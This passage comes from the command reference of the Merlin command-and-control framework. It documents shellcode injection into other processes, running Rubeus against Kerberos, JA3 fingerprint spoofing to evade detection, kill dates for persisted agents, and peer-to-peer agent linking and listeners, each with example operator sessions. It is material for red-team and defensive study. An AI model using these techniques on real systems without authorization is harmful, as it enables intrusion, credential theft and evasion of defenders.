[-]Created job CCWrmdLIFQ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job CCWrmdLIFQ
[+]Shellcode executed successfully
</pre></div>
</div>
</section>
<section id="userapc">
<span id="id10"></span><h3>UserAPC<a class="headerlink" href="#userapc" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span> <span class="pre">userapc</span> <span class="pre">PID</span> <span class="pre">SHELLCODE</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">userapc</span></code> method creates a thread in another process using the
<a class="reference external" href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-queueuserapc">QueueUserAPC</a>
Windows API call.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This method is highly unstable and therefore was intentionally not added to the tab completion list of available methods. The current implementation requires the process to have more than 1 thread. All remaining threads will have a user-mode APC queued to execute the shellcode and could result in multiple instances of execution. This method frequently causes processes to crash. Additionally, the shellcode might not execute at all if none of the threads were in an alertable state. The <code class="docutils literal notranslate"><span class="pre">svchost.exe</span></code> process usually provides a little better choice, but still not guaranteed.</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode userapc 4824 /home/rickastley/calc.bin
[-]Created job NPQGRntaQX for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job NPQGRntaQX
[+]Shellcode executed successfully
</pre></div>
</div>
</section>
</section>
<section id="ifconfig">
<h2>ifconfig<a class="headerlink" href="#ifconfig" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">ifconfig</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">ifconfig</span></code> command will enumerate all of the host’s network interfaces and return their configuration.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
[-] Created job SEbZZEzGeH for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[-] Results job SEbZZEzGeH for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Ethernet0
  MAC Address   00:0c:29:04:29:9d
  IP Address    192.168.1.132
  Subnet Mask   255.255.255.0
  Gateway       192.168.153.2
  DHCP          Enabled
  DHCP Server:  192.168.1.254

Bluetooth Network Connection
  MAC Address   f4:02:28:35:ae:b6
  IP Address    0.0.0.0
  Subnet Mask   0.0.0.0
  Gateway       0.0.0.0
  DHCP          Enabled
  DHCP Server:
</pre></div>
</div>
</section>
<section id="info">
<h2>info<a class="headerlink" href="#info" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">info</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">info</span></code> command is used to get information about a specific agent to include its configuration and environment.</p>
<ul class="simple">
<li><p><strong>ID</strong> - The agent’s unique identifier that is generated on execution</p></li>
<li><p><strong>Alive</strong> - Is the agent alive?</p></li>
<li><p><strong>Status</strong> - The agent’s current communication status of either active, delayed, or dead</p></li>
<li><p><strong>Platform</strong> - The operating system and architecture the agent is running on</p></li>
<li><p><strong>User Name</strong> - The user name the agent is currently running as</p></li>
<li><p><strong>User GUID</strong> - The unique identifier for the user the agent is currently running as</p></li>
<li><p><strong>Hostname</strong> - The name of the compromised host where the agent is currently running</p></li>
<li><p><strong>Process Name</strong> - The name of the process the agent is currently running in</p></li>
<li><p><strong>Process ID</strong> - The numerical Process ID (PID) that the agent is currently running in</p></li>
<li><p><strong>IP</strong> - A list of interface IP addresses for where the agent is currently running</p></li>
<li><p><strong>Initial Check In</strong> - The date and time the agent first connected to the server</p></li>
<li><p><strong>Last Check In</strong> - The date and time the agent last connected to the server followed by the relative amount of time in parenthesis</p></li>
<li><p><strong>Linked Agents</strong> - Peer-to-peer child agents this agent is connected to</p></li>
<li><p><strong>Groups</strong> - Any server-side groups the agent is a member of</p></li>
<li><p><strong>Note</strong> - Any operator generated notes about the agent</p></li>
<li><p><strong>Agent Version</strong> - The version number of the running agent</p></li>
<li><p><strong>Agent Build</strong> - A hash of the git commit the agent was built from</p></li>
<li><p><strong>Agent Wait Time</strong> - The amount of time the agent waits, or sleeps, between checkins</p></li>
<li><p><strong>Agent Wait Time Skew</strong> - The amount of skew multiplied to the agent wait time</p></li>
<li><p><strong>Agent Message Padding Max</strong> - The maximum amount of random data appended to every message to/from the agent</p></li>
<li><p><strong>Agent Max Retries</strong> - The maximum amount of times an agent can fail to check in before it quits running</p></li>
<li><p><strong>Agent Failed Check In</strong> - The total number of failed check in attempts</p></li>
<li><p><strong>Agent Kill Date</strong> - The date the agent will quit running. <code class="docutils literal notranslate"><span class="pre">1970-01-01T00:00:00Z</span></code> signifies that the kill date is not set</p></li>
<li><p><strong>Agent Communication Protocol</strong> - The protocol the agent is currently communicating over</p></li>
<li><p><strong>Agent JA3 TLS Client Signature</strong> - The JA3 client signature. If empty then the default Merlin signature is being used</p></li>
</ul>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» info

  ID                             | c1090dbc-f2f7-4d90-a241-86e0c0217786
  Alive                          | true
  Status                         | Active
  Platform                       | linux/amd64
  User Name                      | rastley
  User GUID                      | 1000
  Integrity Level                | 3
  Hostname                       | ubuntu
  Process Name                   | /tmp/go-build2984352876/b001/exe/main
  Process ID                     | 3802034
  IP                             | 127.0.0.1/8 ::1/128
                                 | 192.168.1.2/24
                                 | fe80::b7bb:3953:682e:cb7f/64
  Initial Check In               | 2023-10-23T14:43:57Z
  Last Check In                  | 2023-10-23T14:44:09Z (0:00:03
                                 | ago)
  Linked Agents                  | []
  Groups                         | [all]
  Note                           |
                                 |
  Agent Version                  | 1.5.0
  Agent Build                    | nonRelease
  Agent Wait Time                | 10s
  Agent Wait Time Skew           | 3000
  Agent Message Padding Max      | 10
  Agent Max Retries              | 7
  Agent Failed Check In          | 0
  Agent Kill Date                | 1970-01-01T00:00:00Z
  Agent Communication Protocol   | h2
  Agent JA3 TLS Client Signature |
</pre></div>
</div>
</section>
<section id="interact">
<h2>interact<a class="headerlink" href="#interact" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">interact</span> <span class="pre">agentID</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">interact</span></code> command takes one argument, the agent ID, and is used to switch agents and interact with a different, specified agent.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Use the built-in tab completion to cycle through and select the agent to interact with.</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c22c435f-f7c4-445b-bcd4-0d4e020645af]» interact d07edfda-e119-4be2-a20f-918ab701fa3c
Merlin[agent][d07edfda-e119-4be2-a20f-918ab701fa3c]»
</pre></div>
</div>
</section>
<section id="invoke-assembly">
<span id="id11"></span><h2>invoke-assembly<a class="headerlink" href="#invoke-assembly" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">invoke-assembly</span> <span class="pre">assemblyName</span> <span class="pre">[assemblyArguments]</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">invoke-assembly</span></code> command will execute a .NET assembly that was previously loaded into the agent with the
<a class="reference internal" href="#load-assembly">load-assembly</a> command. The first argument is the name of the assembly and all the remaining arguments are passed to
the assembly for execution. Use the <a class="reference internal" href="#list-assemblies">list-assemblies</a> command return a list of loaded assemblies.
The <a class="reference internal" href="#execute-assembly">execute-assembly</a> command is different because it uses injection to run the assembly in a child process.
This command runs the assembly in the current process without injection.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Only CLR v4 is currently supported which can be used to execute both v3.5 and v4 .NET assemblies</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» invoke-assembly Rubeus.exe klist
[-] Created job GlPHKaRtmg for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[-] Results job GlPHKaRtmg for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+]
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


Action: List Kerberos Tickets (Current User)

[*] Current LUID    : 0x37913
</pre></div>
</div>
</section>
<section id="ipconfig">
<h2>ipconfig<a class="headerlink" href="#ipconfig" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">ipconfig</span></code></p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This is command is the same as the ifconfig command</p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">ipconfig</span></code> command will enumerate all of the host’s network interfaces and return their configuration.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
[-] Created job SEbZZEzGeH for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[-] Results job SEbZZEzGeH for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Ethernet0
  MAC Address   00:0c:29:04:29:9d
  IP Address    192.168.1.132
  Subnet Mask   255.255.255.0
  Gateway       192.168.153.2
  DHCP          Enabled
  DHCP Server:  192.168.1.254

Bluetooth Network Connection
  MAC Address   f4:02:28:35:ae:b6
  IP Address    0.0.0.0
  Subnet Mask   0.0.0.0
  Gateway       0.0.0.0
  DHCP          Enabled
  DHCP Server:
</pre></div>
</div>
</section>
<section id="ja3">
<span id="id12"></span><h2>ja3<a class="headerlink" href="#ja3" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">ja3</span> <span class="pre">signature</span></code></p>
</div>
<p><a class="reference external" href="https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967">JA3 is a method for fingerprinting TLS clients on the wire</a>. Every TLS client has a unique signature depending on its configuration of the following TLS options: <code class="docutils literal notranslate"><span class="pre">SSLVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats</span></code>.</p>
<p>The <code class="docutils literal notranslate"><span class="pre">ja3</span></code> option allows the agent to create a TLS client based on the provided JA3 hash signature. This is useful to evade detections based on a JA3 hash for a known tool (e.g.,. Merlin). <a class="reference external" href="https://engineering.salesforce.com/gquic-protocol-analysis-and-fingerprinting-in-zeek-a4178855d75f">This</a> article documents a JA3 fingerprint for Merlin. Known JA3 signatures can be downloaded from <a class="reference external" href="https://ja3er.com/">https://ja3er.com/</a></p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Make sure the input JA3 hash will enable communications with the Server. For example, if you leverage a JA3 hash that only supports SSLv2 and the server does not support that protocol, then they will not be able to communicate. The <code class="docutils literal notranslate"><span class="pre">-ja3</span></code> flag will override the the <code class="docutils literal notranslate"><span class="pre">-proto</span></code> flag and will cause the agent to use the protocol provided in the JA3 hash.</p>
</div>
<p>This example will create a TLS client with a JA3 hash of <code class="docutils literal notranslate"><span class="pre">51a7ad14509fd614c7bb3a50c4982b8c</span></code> that matches Java based malware such as Neutrino and Nuclear Exploit Kit (EK).</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ja3 769,49161-49171-47-49156-49166-51-50-49159-49169-5-49154-49164-49160-49170-10-49155-49165-22-19-4-255,10-11-0,23-1-3-19-21-6-7-9-10-24-11-12-25-13-14-15-16-17-2-18-4-5-20-8-22,0
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
[-] Created job DWXtIAdjYz for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
</pre></div>
</div>
</section>
<section id="jobs">
<h2>jobs<a class="headerlink" href="#jobs" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">jobs</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">jobs</span></code> command will display a table of all active jobs assigned to the agent. The output will not include jobs that have already completed.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» jobs

      ID     | STATUS  |     TYPE     |       CREATED        |         SENT
+------------+---------+--------------+----------------------+----------------------+
  whFGRWHudV | Sent    | NativeCmd    | 2020-12-18T11:45:07Z | 2020-12-18T11:45:38Z
  UxegCkyROR | Sent    | AgentControl | 2020-12-18T11:45:11Z | 2020-12-18T11:45:38Z
  YqhfUvxkqZ | Created | CmdPayload   | 2020-12-18T11:45:44Z |
</pre></div>
</div>
</section>
<section id="kill">
<span id="id13"></span><h2>kill<a class="headerlink" href="#kill" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">kill</span> <span class="pre">pid</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">kill</span></code> command is used to force a running process to quit or exit by its numerical identifier. The Process ID (PID) must be provided.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell &quot;ps aux|grep gnome-calculator&quot;
[-] Created job mBYVsnbYBS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job mBYVsnbYBS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] john      132905  0.3  0.6 890376 50268 ?        Sl   07:41   0:00 gnome-calculator

Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» kill 132905
[-] Created job rjXgPGnZYl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job rjXgPGnZYl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Successfully killed pid 132905
</pre></div>
</div>
</section>
<section id="killdate">
<span id="id14"></span><h2>killdate<a class="headerlink" href="#killdate" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE <code class="docutils literal notranslate"><span class="pre">killdate</span> <span class="pre">epochDateTime</span></code></p>
</div>
<p>Killdate is a UNIX timestamp that denotes a time the executable will not run after (if it is 0 it will not be used). Killdate is checked before the agent performs each checkin, including before the initial checkin.</p>
<p>Killdate can be set in the agent/agent.go file before compiling, in the New function instantiation of a new agent. One scenario for using the killdate feature is an agent is persisted as a service and you want it to stop functioning after a certain date, in case the target organization fails to remediate the malicious service. Using killdate here would stop the agent from functioning after a certain specified UNIX system time.</p>
<p>The Killdate can also be set or changed for running agents using the <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">killdate</span></code> command from the agent menu. This will only modify the killdate for the running agent in memory and will not update the compiled binary file. <a class="reference external" href="http://unixtimestamp.50x.eu/">http://unixtimestamp.50x.eu/</a> can be used to generate a UNIX timestamp.</p>
<p>A UNIX timestamp of <cite>0</cite> will read like <cite>1970-01-01T00:00:00Z</cite> in the agent info table.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» killdate 811123200
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
[-]Created job utpISXXXbl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
</pre></div>
</div>
</section>
<section id="link">
<h2>link<a class="headerlink" href="#link" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">link</span> <span class="pre">{add|list|remove|refresh|tcp|udp|smb}</span> <span class="pre">address</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">link</span></code> command establishes a connection link with a peer-to-peer Agent.
The <code class="docutils literal notranslate"><span class="pre">link</span></code> has the following methods:</p>
<blockquote>
<div><ul class="simple">
<li><p><a class="reference internal" href="#link-add"><span class="std std-ref">add</span></a></p></li>
<li><p><a class="reference internal" href="#link-list"><span class="std std-ref">list</span></a></p></li>
<li><p><a class="reference internal" href="#link-remove"><span class="std std-ref">remove</span></a></p></li>
<li><p><a class="reference internal" href="#link-refresh"><span class="std std-ref">refresh</span></a></p></li>
<li><p><a class="reference internal" href="#link-smb"><span class="std std-ref">smb</span></a></p></li>
<li><p><a class="reference internal" href="#link-tcp"><span class="std std-ref">tcp</span></a></p></li>
<li><p><a class="reference internal" href="#link-udp"><span class="std std-ref">udp</span></a></p></li>
</ul>
</div></blockquote>
<section id="add">
<span id="link-add"></span><h3>add<a class="headerlink" href="#add" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">link</span> <span class="pre">add</span> <span class="pre">childAgentID</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">link</span> <span class="pre">add</span></code> command manually adds a peer-to-peer child Agent link by UUID on the server.
This is useful if the Server was restarted and does not know about the peer-to-peer parent/child relationship.
This command does not add or create a peer-to-peer link on the Agent itself.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» link add afe6e797-f06f-449c-9f7a-2ba3df50c1b8
    [+] Successfully added child agent afe6e797-f06f-449c-9f7a-2ba3df50c1b8 link to parent agent c1090dbc-f2f7-4d90-a241-86e0c0217786
</pre></div>
</div>
</section>
<section id="list">
<span id="link-list"></span><h3>list<a class="headerlink" href="#list" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">link</span> <span class="pre">list</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">link</span> <span class="pre">list</span></code> command instructs the Agent to return a list of its peer-to-peer links.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» link list
[-] Created job SisWtXgSke for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-22T12:06:22Z
[-] Results of job SisWtXgSke for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-22T12:06:40Z
[+] Peer-to-Peer Links (2)
    0. tcp-bind:c426dce8-ffd9-42cc-8393-8885b731cc3b9:127.0.0.1:7777
    1. udp-bind:2f915108-0dd2-40fe-bf8b-8503b840a6ee:127.0.0.1:7777
</pre></div>
</div>
</section>
<section id="remove">
<span id="link-remove"></span><h3>remove<a class="headerlink" href="#remove" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">link</span> <span class="pre">remove</span> <span class="pre">childAgentID</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">link</span> <span class="pre">remove</span></code> command instructs the Agent to remove a child peer-to-peer Agent link.
This is useful if a child peer-to-peer Agent dies but did not gracefully close the connection with the parent.
This is more common with reverse peer-to-peer Agents.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» link remove c426dce8-ffd9-42cc-8393-8885b731cc3b
[-] Created job JgjPdlbVTD for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-22T12:23:08Z
[-] Results of job JgjPdlbVTD for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-22T12:23:26Z
[+] Successfully removed P2P link for c426dce8-ffd9-42cc-8393-8885b731cc3b
</pre></div>
</div>
</section>
<section id="refresh">
<span id="link-refresh"></span><h3>refresh<a class="headerlink" href="#refresh" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">link</span> <span class="pre">refresh</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">link</span> <span class="pre">refresh</span></code> command instructs the Agent to update the server with a full list of child peer-to-peer Agents.
This is useful if the server is restarted and is not tracking the parent/child relationships or when a reverse Agent
has negative sleep.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» link refresh
[-] Created job jSWPVmORJq for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-22T12:32:21Z
[-] Results of job jSWPVmORJq for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-22T12:32:42Z
[+] Created upstream delegate messages for:
Peer-to-Peer Links (1)
0. tcp-bind:c426dce8-ffd9-42cc-8393-8885b731cc3b:127.0.0.1:7777
</pre></div>
</div>
</section>
<section id="smb">
<span id="link-smb"></span><h3>smb<a class="headerlink" href="#smb" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">link</span> <span class="pre">smb</span> <span class="pre">address</span> <span class="pre">pipeName</span></code></p>
</div>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>The parent must be running on Windows because the Agent has not re-implement SMB</p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">link</span> <span class="pre">smb</span></code> command links to a child peer-to-peer bind SMB Agent.
The ADDRESS can be a <code class="docutils literal notranslate"><span class="pre">.</span></code> for the localhost, an IP address, or a DNS hostname.
The parent Agent must be running on a Windows host.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Merlin[agent][eb2a4636-cd93-4818-a844-87340d4a1c6a]» link smb . merlinpipe
[-] Created job ykIsVgNQDO for agent eb2a4636-cd93-4818-a844-87340d4a1c6a at 2023-07-22T13:09:57Z
[-] Results of job ykIsVgNQDO for agent eb2a4636-cd93-4818-a844-87340d4a1c6a at 2023-07-22T13:10:15Z
[+] Successfully connected to smb-bind Agent 206babc3-34fe-49fd-a018-9d4d1026bbec at \\\\.\\pipe\\merlinpipe
[+] New authenticated agent checkin for 206babc3-34fe-49fd-a018-9d4d1026bbec at 2023-07-22T13:10:47Z

Merlin[agent][1156a10c-9bc3-4d27-ad9f-5723be452cc6]» link smb 192.168.79.128 merlinpipe
[-] Created job NsFduoHEGW for agent 1156a10c-9bc3-4d27-ad9f-5723be452cc6 at 2023-07-22T13:14:35Z
[-] Results of job NsFduoHEGW for agent 1156a10c-9bc3-4d27-ad9f-5723be452cc6 at 2023-07-22T13:14:59Z
[+] Successfully connected to smb-bind Agent 295b0dab-af06-480c-b43b-eb81be87aa0b at \\\\192.168.79.128\\pipe\\merlinpipe
[+] New authenticated agent checkin for 295b0dab-af06-480c-b43b-eb81be87aa0b at 2023-07-22T13:15:34Z
</pre></div>
</div>
</section>
<section id="tcp">
<span id="link-tcp"></span><h3>tcp<a class="headerlink" href="#tcp" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">link</span> <span class="pre">tcp</span> <span class="pre">interface:port</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">link</span> <span class="pre">tcp</span></code> command links to a child peer-to-peer bind TCP Agent.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» link tcp 127.0.0.1:7777
[-] Created job fpXxQBSMrN for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-22T11:53:32Z
[-] Results of job fpXxQBSMrN for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-22T11:53:54Z
[+] Successfully connected to tcp-bind Agent c426dce8-ffd9-42cc-8393-8885b731cc3b at 127.0.0.1:7777
[+] New authenticated agent checkin for c426dce8-ffd9-42cc-8393-8885b731cc3b at 2023-07-22T11:54:29Z
</pre></div>
</div>
</section>
<section id="udp">
<span id="link-udp"></span><h3>udp<a class="headerlink" href="#udp" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">link</span> <span class="pre">udp</span> <span class="pre">interface:port</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">link</span> <span class="pre">udp</span></code> command links to a child peer-to-peer bind UDP Agent.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» link udp 127.0.0.1:7777
[-] Created job GflFUgVCwS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-22T12:03:47Z
[-] Results of job GflFUgVCwS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-22T12:04:00Z
[+] Successfully connected to udp-bind Agent 2f915108-0dd2-40fe-bf8b-8503b840a6ee at 127.0.0.1:7777
[+] New authenticated agent checkin for 2f915108-0dd2-40fe-bf8b-8503b840a6ee at 2023-07-22T12:04:31Z
</pre></div>
</div>
</section>
</section>
<section id="listener">
<h2>listener<a class="headerlink" href="#listener" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">listener</span> <span class="pre">{list|start|stop}</span> <span class="pre">[protocol]</span> <span class="pre">[address]</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">listener</span></code> command starts, stops, or lists peer-to-peer listeners on the Agent.</p>
<blockquote>
<div><ul class="simple">
<li><p><a class="reference internal" href="#listener-list"><span class="std std-ref">list</span></a></p></li>
<li><p><a class="reference internal" href="#listener-start"><span class="std std-ref">start</span></a></p></li>
<li><p><a class="reference internal" href="#listener-stop"><span class="std std-ref">stop</span></a></p></li>
</ul>
</div></blockquote>
<section id="listener-list">
<span id="id15"></span><h3>list<a class="headerlink" href="#listener-list" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">listener</span> <span class="pre">list</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">listener</span> <span class="pre">list</span></code> command instruct the Agent to return a list of its peer-to-peer listeners.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>The string <code class="docutils literal notranslate"><span class="pre">[::]</span></code> signifies all IP interfaces</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» listener list
[-] Created job OebvmmBQPr for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-23T16:44:33Z
[-] Results of job OebvmmBQPr for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-23T16:44:53Z
[+] Peer-to-Peer Listeners (3):
0. TCP listener on 127.0.0.1:7777
1. UDP listener on [::]:8888
2. SMB listener on \\\\.\\pipe\\merlinpipe
</pre></div>
</div>
</section>
<section id="start">
<span id="listener-start"></span><h3>start<a class="headerlink" href="#start" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">listener</span> <span class="pre">start</span> <span class="pre">{smb|tcp|udp}</span> <span class="pre">{namedPipe|&lt;interface:port&gt;}</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">listener</span> <span class="pre">start</span></code> command instructs the Agent to start a peer-to-peer listener for reverse connections.
Use ‘0.0.0.0’ for all IPv4 interfaces. Only provide the name of the pipe for the SMB listener (e.g., merlinPipe).</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» listener start tcp 127.0.0.1:7777
[-] Created job LkIuWumcOt for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-23T16:40:24Z
[-] Results of job LkIuWumcOt for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-23T16:40:37Z
[+] Successfully started TCP listener on 127.0.0.1:7777\n

Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» listener start udp 0.0.0.0:8888
[-] Created job suVecDPJhC for agent d942a9a5-a68e-42e7-8d26-71ac45e8345a at 2023-07-23T16:41:43Z
[-] Results of job suVecDPJhC for agent d942a9a5-a68e-42e7-8d26-71ac45e8345a at 2023-07-23T16:41:56Z
[+] Successfully started UDP listener on 0.0.0.0:8888
</pre></div>
</div>
</section>
<section id="stop">
<span id="listener-stop"></span><h3>stop<a class="headerlink" href="#stop" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">listener</span> <span class="pre">stop</span> <span class="pre">{smb|tcp|udp}</span> <span class="pre">{namedPipe|&lt;interface:port&gt;}</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">listener</span> <span class="pre">stop</span></code> command instructs the Agent to stop a peer-to-peer listener.</p>
